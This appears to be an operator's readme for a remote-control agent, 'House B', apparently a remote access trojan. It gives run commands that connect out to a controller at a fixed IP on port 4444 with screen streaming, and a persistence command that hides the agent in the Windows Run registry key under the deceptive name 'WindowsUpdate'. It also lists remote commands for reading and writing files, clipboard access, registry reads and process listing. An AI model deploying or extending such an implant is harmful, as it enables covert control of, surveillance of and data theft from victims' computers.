Agent - House B (TLS-encrypted, 100+ commands)
===============================================
Run:
  agent.exe -controller 176.229.98.54:4444 -ca server.crt
  agent.exe -controller 176.229.98.54:4444 -insecure   (test)
  agent.exe -controller 176.229.98.54:4444 -ca server.crt -fps 1  (stream)

Persistence:
  agent.exe -persist   (HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate)
  # or PowerShell: Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name WindowsUpdate -Value ""C:\path\agent.exe" -controller 176.229.98.54:4444 -ca server.crt"

Commands: help, list-commands, get-system-info, get-cpu-info, get-memory-usage, list-directory, read-file, write-file, get-file-hash, mouse-move, clipboard-get/set, reg-read, get-services, get-processes, get-public-ip, etc. (100+ via commands.KnownCommands)

Cert: server.crt must match controller's server.crt (SAN includes 176.229.98.54)
